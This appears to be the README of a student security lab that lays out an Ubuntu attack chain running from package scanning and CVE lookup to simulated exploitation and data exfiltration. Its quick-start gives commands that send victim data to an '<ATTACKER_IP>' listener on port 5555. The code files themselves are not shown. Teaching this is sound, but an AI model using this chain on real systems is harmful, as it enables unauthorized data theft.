# TP5: Vulnerability Detection & Data Exfiltration - Ubuntu Edition

## 🎯 Objectives

This TP demonstrates **how attackers**:
1. **Detect installed applications** on a target system
2. **Check for outdated/vulnerable versions** (CVE analysis)
3. **Identify dangerous vulnerabilities** that allow data theft
4. **Exploit vulnerabilities** with malicious code
5. **Exfiltrate sensitive data** back to attacker's machine

---

## 📋 Questions This TP Answers

### Question 1: How can we check how many installed applications are there on a computer?
**Answer**: Scan system package managers (`apt`, `dpkg`), running processes, and configuration files.

### Question 2: Which applications are out-of-date and which are not?
**Answer**: Compare installed versions against official repositories and CVE databases.

### Question 3: Among out-of-date applications, which produces the most dangerous data breach?
**Answer**: Analyze CVE severity scores (CVSS) and impact on critical components.

### Question 4: How do attackers use out-of-date applications?
**Answer**: Exploit known vulnerabilities to execute arbitrary code and steal data.

---

## 🏗️ Architecture

```
┌─────────────────────────────────────┐
│   VICTIM COMPUTER (Ubuntu)          │
│                                     │
│  1. installed_apps_detector.py      │
│     ↓ (Scans installed apps)        │
│  2. vulnerability_checker.py        │
│     ↓ (Checks for CVEs)             │
│  3. risk_analyzer.py                │
│     ↓ (Analyzes threat level)       │
│  4. malware_simulator.py            │
│     ↓ (Exploits vulnerability)      │
│  5. data_exfiltration.py            │
│     ↓ (Sends data to attacker)      │
│                                     │
└──────────────────┬──────────────────┘
                   │ NETWORK
                   ↓
┌──────────────────────────────────┐
│   ATTACKER COMPUTER              │
│                                  │
│  server_receiver.py              │
│  (Receives stolen data)          │
│                                  │
└──────────────────────────────────┘
```

---

## 📁 Files in This Project

| File | Purpose |
|------|---------|
| `installed_apps_detector.py` | Scan all installed packages on Ubuntu |
| `vulnerability_checker.py` | Check package versions against CVE database |
| `risk_analyzer.py` | Analyze CVE severity and data breach risk |
| `malware_simulator.py` | Simulate exploitation of vulnerabilities |
| `data_exfiltration.py` | Client: Collects and sends data to attacker |
| `server_receiver.py` | Server: Receives data on attacker's machine |
| `ATTACK_SCENARIO.md` | Detailed attack flow explanation |
| `TESTING_GUIDE.md` | Step-by-step testing instructions |

---

## 🚀 Quick Start

### On Victim Machine (Ubuntu):
```bash
# 1. Run the complete attack chain
python data_exfiltration.py --target-server <ATTACKER_IP> --port 5555

# Or run individually to understand each step
python installed_apps_detector.py          # Step 1: Detect apps
python vulnerability_checker.py            # Step 2: Find vulnerabilities
python risk_analyzer.py                    # Step 3: Analyze risk
python malware_simulator.py                # Step 4: Exploit vulnerability
python data_exfiltration.py                # Step 5: Send data
```

### On Attacker's Machine:
```bash
# Start the server to receive data
python server_receiver.py --listen 0.0.0.0 --port 5555
```

---

## ⚠️ IMPORTANT: EDUCATIONAL USE ONLY

This code is **FOR EDUCATIONAL PURPOSES ONLY**. It demonstrates:
- Real attack techniques used by cybercriminals
- How to defend against such attacks
- Why keeping systems updated is critical

**DO NOT USE FOR ACTUAL ATTACKS OR UNAUTHORIZED SYSTEMS!**

---

## 🔒 Defense Lessons

After learning how attackers work, you should:
1. **Keep systems updated**: Patch all vulnerabilities immediately
2. **Monitor networks**: Detect suspicious outbound connections
3. **Use firewalls**: Block unauthorized data exfiltration
4. **Install antivirus**: Detect and quarantine malicious code
5. **Audit logs**: Track suspicious activities

---

## 📚 References

- CVE (Common Vulnerabilities and Exposures): https://cve.mitre.org/
- NVD (National Vulnerability Database): https://nvd.nist.gov/
- CVSS (Common Vulnerability Scoring System): https://www.first.org/cvss/

